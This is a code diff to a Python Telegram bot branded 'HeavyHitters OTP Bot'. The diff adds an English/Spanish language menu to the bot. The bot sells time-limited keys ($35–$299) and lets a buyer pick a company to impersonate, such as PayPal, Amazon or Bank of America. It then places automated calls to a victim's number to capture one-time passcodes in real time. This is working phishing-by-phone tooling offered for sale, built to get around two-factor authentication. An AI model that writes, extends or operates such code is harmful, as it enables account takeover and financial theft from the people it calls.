@@ -390,14 +390,107 @@ def call_status():
         notify_telegram(chat_id, f"📴 *Llamada finalizada*\n📱 `{to_number}`")
     return "", 204
 
-def menu_sin_key():
+# ─── TEXTOS POR IDIOMA ────────────────────────────────────────────────────────
+TEXTOS = {
+    "es": {
+        "bienvenida_activo": "🔐 *HeavyHitters OTP Bot*\n\nBienvenido de vuelta. Selecciona una opción del menú.",
+        "selecciona": "Selecciona una acción:",
+        "bienvenida": (
+            "🔐 *HeavyHitters OTP Bot*\n\n"
+            "Bienvenido al sistema de llamadas automatizadas más poderoso del mercado.\n\n"
+            "✅ Llama a tus clientes automáticamente\n"
+            "✅ Obtén códigos OTP en tiempo real\n"
+            "✅ Control total desde Telegram\n"
+            "✅ Activación inmediata con key\n\n"
+            "💼 *Planes disponibles:*\n"
+            "🥉 1 Día — $35\n"
+            "🥈 3 Días — $79\n"
+            "🥇 1 Semana — $129\n"
+            "👑 1 Mes — $299\n\n"
+            "📩 Para adquirir tu plan contacta:\n@heavyhittersrd"
+        ),
+        "activa_plan": "Activa tu plan para comenzar:",
+        "escribe_numero": "📱 Escribe el número a llamar:\n`+13023451233`",
+        "llamando": "📞 Llamando a",
+        "llamada_iniciada": "✅ Llamada iniciada",
+        "sin_plan": "❌ Necesitas activar una key primero.",
+        "key_escribe": "🔑 Escribe tu key:\n`HVY-XXXX-XXXX-XXXX`",
+        "key_activada": "🎉 *¡Key activada!*\n📋 Plan: *{plan}*\n📅 Expira: *{fecha}*\n\nYa puedes usar el bot.",
+        "key_invalida": "❌ Key inválida.",
+        "key_usada": "❌ Esta key ya fue usada.",
+        "soporte": "📞 Contacta: @heavyhittersrd",
+        "planes": (
+            "💼 *Planes*\n🥉 1 Día — $35\n🥈 3 Días — $79\n"
+            "🥇 1 Semana — $129\n👑 1 Mes — $299\n\nContacta: @heavyhittersrd"
+        ),
+        "empresa": "🏢 *¿Qué empresa representas?*",
+        "empresa_sel": "seleccionada\n\n📱 Escribe el número a llamar:\n`+13023451233`",
+        "usa_menu": "Usa el menú.",
+    },
+    "en": {
+        "bienvenida_activo": "🔐 *HeavyHitters OTP Bot*\n\nWelcome back. Select an option from the menu.",
+        "selecciona": "Select an action:",
+        "bienvenida": (
+            "🔐 *HeavyHitters OTP Bot*\n\n"
+            "Welcome to the most powerful automated calling system on the market.\n\n"
+            "✅ Call your clients automatically\n"
+            "✅ Get OTP codes in real time\n"
+            "✅ Full control from Telegram\n"
+            "✅ Instant activation with key\n\n"
+            "💼 *Available Plans:*\n"
+            "🥉 1 Day — $35\n"
+            "🥈 3 Days — $79\n"
+            "🥇 1 Week — $129\n"
+            "👑 1 Month — $299\n\n"
+            "📩 To get your plan contact:\n@heavyhittersrd"
+        ),
+        "activa_plan": "Activate your plan to get started:",
+        "escribe_numero": "📱 Enter the number to call:\n`+13023451233`",
+        "llamando": "📞 Calling",
+        "llamada_iniciada": "✅ Call started",
+        "sin_plan": "❌ You need to activate a key first.",
+        "key_escribe": "🔑 Enter your key:\n`HVY-XXXX-XXXX-XXXX`",
+        "key_activada": "🎉 *Key activated!*\n📋 Plan: *{plan}*\n📅 Expires: *{fecha}*\n\nYou can now use the bot.",
+        "key_invalida": "❌ Invalid key.",
+        "key_usada": "❌ This key has already been used.",
+        "soporte": "📞 Contact: @heavyhittersrd",
+        "planes": (
+            "💼 *Plans*\n🥉 1 Day — $35\n🥈 3 Days — $79\n"
+            "🥇 1 Week — $129\n👑 1 Month — $299\n\nContact: @heavyhittersrd"
+        ),
+        "empresa": "🏢 *Which company do you represent?*",
+        "empresa_sel": "selected\n\n📱 Enter the number to call:\n`+13023451233`",
+        "usa_menu": "Use the menu.",
+    }
+}
+
+def get_lang(context):
+    return context.user_data.get("lang", "es")
+
+def t(context, key, **kwargs):
+    lang = get_lang(context)
+    texto = TEXTOS.get(lang, TEXTOS["es"]).get(key, key)
+    return texto.format(**kwargs) if kwargs else texto
+
+def menu_sin_key(lang="es"):
+    if lang == "en":
+        return ReplyKeyboardMarkup([
+            [KeyboardButton("🔑 Redeem Key")],
+            [KeyboardButton("💼 View Plans")],
+            [KeyboardButton("📞 Support")],
+        ], resize_keyboard=True)
     return ReplyKeyboardMarkup([
         [KeyboardButton("🔑 Redeem Key")],
         [KeyboardButton("💼 Ver Planes")],
         [KeyboardButton("📞 Soporte")],
     ], resize_keyboard=True)
 
-def menu_con_key():
+def menu_con_key(lang="es"):
+    if lang == "en":
+        return ReplyKeyboardMarkup([
+            [KeyboardButton("🔐 Get OTP")],
+            [KeyboardButton("🛒 Buy Plan"), KeyboardButton("📞 Support")],
+        ], resize_keyboard=True)
     return ReplyKeyboardMarkup([
         [KeyboardButton("🔐 Obtener OTP")],
         [KeyboardButton("🛒 Comprar Plan"), KeyboardButton("📞 Soporte")],
@@ -417,37 +510,19 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     imagen  = "https://i.ibb.co/Fbm7Br8N/image-9.jpg"
 
-    if is_active(chat_id):
-        await update.message.reply_photo(
-            photo=imagen,
-            caption=(
-                "🔐 *HeavyHitters OTP Bot*\n\n"
-                "Bienvenido de vuelta. Selecciona una opción del menú."
-            ),
-            parse_mode="Markdown"
-        )
-        await update.message.reply_text("Selecciona una acción:", reply_markup=menu_con_key())
-    else:
-        await update.message.reply_photo(
-            photo=imagen,
-            caption=(
-                "🔐 *HeavyHitters OTP Bot*\n\n"
-                "Bienvenido al sistema de llamadas automatizadas más poderoso del mercado.\n\n"
-                "✅ Llama a tus clientes automáticamente\n"
-                "✅ Obtén códigos OTP en tiempo real\n"
-                "✅ Control total desde Telegram\n"
-                "✅ Activación inmediata con key\n\n"
-                "💼 *Planes disponibles:*\n"
-                "🥉 1 Día — $35\n"
-                "🥈 3 Días — $79\n"
-                "🥇 1 Semana — $129\n"
-                "👑 1 Mes — $299\n\n"
-                "📩 Para adquirir tu plan contacta:\n"
-                "@heavyhittersrd"
-            ),
-            parse_mode="Markdown"
-        )
-        await update.message.reply_text("Activa tu plan para comenzar:", reply_markup=menu_sin_key())
+    # Mostrar selector de idioma primero
+    keyboard = InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("🇺🇸 English", callback_data="lang|en"),
+            InlineKeyboardButton("🇪🇸 Español", callback_data="lang|es"),
+        ]
+    ])
+    await update.message.reply_photo(
+        photo=imagen,
+        caption="🌐 *Select your language / Selecciona tu idioma:*",
+        parse_mode="Markdown",
+        reply_markup=keyboard
+    )
 
 async def cmd_genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat.id != ADMIN_CHAT_ID:
@@ -484,46 +559,36 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if texto == "🔑 Redeem Key":
         context.user_data["esperando_key"] = True
-        await update.message.reply_text("🔑 Escribe tu key:\n`HVY-XXXX-XXXX-XXXX`", parse_mode="Markdown")
+        await update.message.reply_text(t(context, "key_escribe"), parse_mode="Markdown")
         return
 
     if context.user_data.get("esperando_key"):
         context.user_data.pop("esperando_key")
         key = texto.upper().strip()
+        lang = get_lang(context)
         result, error = redeem_key(key, chat_id)
         if error:
             await update.message.reply_text(error)
         else:
             expires = datetime.fromisoformat(result["expires_at"])
             await update.message.reply_text(
-                f"🎉 *¡Key activada!*\n📋 {result['plan']}\n📅 Expira: {expires.strftime('%d/%m/%Y')}",
-                parse_mode="Markdown", reply_markup=menu_con_key())
+                t(context, "key_activada", plan=result["plan"], fecha=expires.strftime("%d/%m/%Y")),
+                parse_mode="Markdown", reply_markup=menu_con_key(lang))
         return
 
-    if texto == "💼 Ver Planes":
-        await update.message.reply_text(
-            "💼 *Planes HeavyHitters OTP*\n"
-            "━━━━━━━━━━━━━━━━━\n\n"
-            "🥉 *1 Día* — $35\n"
-            "🥈 *3 Días* — $79\n"
-            "🥇 *1 Semana* — $129\n"
-            "👑 *1 Mes* — $299\n\n"
-            "✅ Llamadas ilimitadas incluidas\n"
-            "✅ Cobros, confirmaciones, recordatorios y más\n"
-            "✅ Activación inmediata con key\n\n"
-            "📩 Para comprar contacta: @heavyhittersrd",
-            parse_mode="Markdown")
+    if texto in ["💼 Ver Planes", "💼 View Plans"]:
+        await update.message.reply_text(t(context, "planes"), parse_mode="Markdown")
         return
 
-    if texto == "📞 Soporte":
-        await update.message.reply_text("📞 Contacta: @heavyhittersrd")
+    if texto in ["📞 Soporte", "📞 Support"]:
+        await update.message.reply_text(t(context, "soporte"))
         return
 
     if not is_active(chat_id):
-        await update.message.reply_text("❌ Necesitas activar una key primero.", reply_markup=menu_sin_key())
+        await update.message.reply_text(t(context, "sin_plan"), reply_markup=menu_sin_key(get_lang(context)))
         return
 
-    if texto == "🔐 Obtener OTP":
+    if texto in ["🔐 Obtener OTP", "🔐 Get OTP"]:
         keyboard = [
             [InlineKeyboardButton("💰 PayPal", callback_data="empresa|paypal"),
              InlineKeyboardButton("🛍️ Amazon", callback_data="empresa|amazon")],
@@ -535,32 +600,28 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
              InlineKeyboardButton("🏦 Bank of America", callback_data="empresa|bofa")],
         ]
         await update.message.reply_text(
-            "🏢 *¿Qué empresa representas?*",
+            t(context, "empresa"),
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return
 
-    if texto == "🛒 Comprar Plan":
-        await update.message.reply_text(
-            "💼 *Planes*\n🥉 1 Día — $30\n🥈 3 Días — $70\n🥇 1 Semana — $100\n👑 1 Mes — $300\n\nContacta: @heavyhittersrd",
-            parse_mode="Markdown")
+    if texto in ["🛒 Comprar Plan", "🛒 Buy Plan"]:
+        await update.message.reply_text(t(context, "planes"), parse_mode="Markdown")
         return
 
     if "accion" in context.user_data:
         accion = context.user_data.pop("accion")
         numero = texto if texto.startswith("+") else "+" + texto
         try:
-            await update.message.reply_text(f"📞 Llamando a `{numero}`...", parse_mode="Markdown")
+            await update.message.reply_text(f"{t(context, 'llamando')} `{numero}`...", parse_mode="Markdown")
             call = sw_client.calls.create(
                 to=numero, from_=SW_NUMBER,
                 url=f"{WEBHOOK_BASE_URL}/voice/{accion}",
                 status_callback=f"{WEBHOOK_BASE_URL}/status",
-                status_callback_method="POST",
-                machine_detection="Enable",
-                machine_detection_timeout=5)
+                status_callback_method="POST")
             call_sessions[call.sid] = {"chat_id": chat_id}
-            await update.message.reply_text("✅ Llamada iniciada")
+            await update.message.reply_text(t(context, "llamada_iniciada"))
         except Exception as e:
             await update.message.reply_text(f"❌ Error: `{e}`", parse_mode="Markdown")
         return
@@ -584,20 +645,47 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(f"❌ Error: `{e}`", parse_mode="Markdown")
         return
 
-    await update.message.reply_text("Usa el menú.", reply_markup=menu_con_key() if is_active(chat_id) else menu_sin_key())
+    await update.message.reply_text(t(context, "usa_menu"), reply_markup=menu_con_key(get_lang(context)) if is_active(chat_id) else menu_sin_key(get_lang(context)))
 
 async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     data = query.data
 
+    # Selección de idioma
+    if data.startswith("lang|"):
+        _, lang = data.split("|")
+        context.user_data["lang"] = lang
+        chat_id = query.message.chat_id
+
+        if is_active(chat_id):
+            await query.edit_message_caption(
+                caption=TEXTOS[lang]["bienvenida_activo"],
+                parse_mode="Markdown"
+            )
+            await query.message.reply_text(
+                TEXTOS[lang]["selecciona"],
+                reply_markup=menu_con_key(lang)
+            )
+        else:
+            await query.edit_message_caption(
+                caption=TEXTOS[lang]["bienvenida"],
+                parse_mode="Markdown"
+            )
+            await query.message.reply_text(
+                TEXTOS[lang]["activa_plan"],
+                reply_markup=menu_sin_key(lang)
+            )
+        return
+
     # Selección de empresa
     if data.startswith("empresa|"):
         _, empresa_key = data.split("|")
         empresa = EMPRESAS.get(empresa_key, {})
         context.user_data["accion"] = empresa_key
+        lang = get_lang(context)
         await query.edit_message_text(
-            f"{empresa.get('emoji')} *{empresa.get('nombre')}* seleccionada\n\n📱 Escribe el número a llamar:\n`+13023451233`",
+            f"{empresa.get('emoji')} *{empresa.get('nombre')}* {TEXTOS[lang]['empresa_sel']}",
             parse_mode="Markdown"
         )
         return
